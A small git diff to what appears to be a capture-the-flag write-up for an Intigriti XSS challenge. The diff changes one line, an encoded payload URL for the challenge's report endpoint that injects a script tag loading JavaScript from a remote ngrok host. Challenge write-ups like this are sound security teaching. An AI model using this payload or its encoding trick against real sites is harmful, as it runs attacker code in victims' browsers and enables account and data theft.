@@ -90,7 +90,7 @@ This payload targets the endpoint `https://challenge-1023.intigriti.io/api/repor
 <img src='images/payload.png' alt='payload'/>
 
 ```plaintext
-https://challenge-1023.intigriti.io/api/report?url=/<svg><b id="<%2526%2523x2f%253btitle><script src='https:%2526%2523x2f%253b%2526%2523x2f%253ba9b1-191-45-70-141.ngrok-free.app%2526%2523x2f%253b404.js'><%2526%2523x2f%253bscript>">?startPort=40000
+https://challenge-1023.intigriti.io/api/report?url=/<svg><b id="<%2526%2523x2f%253btitle><script src='https:%2526%2523x2f%253b%2526%2523x2f%253ba9b1-191-45-70-141.ngrok-free.app%2526%2523x2f%253bpage_404.js'><%2526%2523x2f%253bscript>">?startPort=40000
 ```
 
 Let's break it down:
